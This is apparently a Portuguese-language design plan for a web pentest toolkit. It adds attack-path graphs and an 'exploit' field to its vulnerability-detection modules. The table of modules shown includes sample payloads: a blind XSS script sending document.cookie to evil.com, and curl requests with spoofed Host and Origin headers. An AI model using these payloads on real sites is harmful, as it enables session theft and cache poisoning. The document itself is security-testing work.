## Attack Analysis (206-207) — Plano Completo

### Visão Geral
- **206.** Attack path visualization — networkx 3.6.1 + matplotlib 3.11.0
- **207.** Auto-exploit suggestions — campo `exploit` em TODOS os 75 módulos com detecção de vulnerabilidade

### Deps novas
```
networkx>=3.6.1
matplotlib>=3.11.0
```

---

## 206. attackanalysis.py (módulo novo)

**Arquivo:** `src/mytools/web/attackanalysis.py`
**Teste:** `tests/web/test_attackanalysis.py`
**Entry point:** `mytools-analysis = "mytools.web.attackanalysis:main"`

### Técnicas
- `attack_path` — Gerar grafo de caminhos de ataque (networkx.DiGraph + matplotlib)
- `exploit_suggest` — Consolidar exploits de todos os findings

### Funcionalidades
- Recebe JSON de findings (output de attackaudit ou outros módulos)
- Conecta findings relacionados em grafo de dependências
- Renderiza PNG/SVG via matplotlib
- Exporta DOT format (graphviz)
- Cores por severidade: critical=vermelho, high=laranja, medium=amarelo, low=azul, info=cinza

### Exemplo de attack path
```
XSS Reflected → Cookie Theft → Session Hijack → Admin Access → Data Exfil
```

---

## 207. Exploits em 75 módulos

### Padrão de implementação

1. Adicionar `exploit: str = ""` no dataclass de cada módulo
2. Popular o campo quando a técnica é vulnerable
3. Formato do exploit: comando curl com placeholder `<TARGET>`, payload, ou referência

---

### WEB (59 módulos)

| # | Módulo | Dataclass | Exploit | Ferramenta |
|---|--------|-----------|---------|------------|
| 1 | accountabuse.py | AccountAttempt | coupon/loyalty bypass payload | wfuzz |
| 2 | blindxss.py | BlindXSSAttempt | `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>` | XSStrike |
| 3 | bominjection.py | BomAttempt | BOM injection payload (`\xef\xbb\xbf`) | curl |
| 4 | businesslogic.py | BizLogicAttempt | price/quantity manipulation curl | wfuzz |
| 5 | cachepoisoning.py | CacheAttempt | `curl -H "X-Forwarded-Host: evil.com" <TARGET>` | curl |
| 6 | cachedeception.py | DeceptionAttempt | path confusion URL | curl |
| 7 | certcheck.py | CertCheckAttempt | N/A (info only, sem exploit) | N/A |
| 8 | charsetbypass.py | CharsetBypassAttempt | encoding bypass payload | wfuzz |
| 9 | clickjacking.py | ClickjackAttempt | `<iframe src="<TARGET>" style="opacity:0.0001"></iframe>` | curl |
| 10 | cookieboundary.py | CookieBoundaryAttempt | cookie theft payload | curl |
| 11 | corsmisconfig.py | CORSAttempt | `curl -H "Origin: evil.com" -v <TARGET>` | curl |
| 12 | crlfinjection.py | CRLFAttempt | `<TARGET>/%0D%0AX-Injected:%20malicious` | curl |
| 13 | cssinject.py | CSSInjectAttempt | CSS exfiltration payload | XSStrike |
| 14 | deserialinject.py | DeserialAttempt | ysoserial payload | ysoserial |
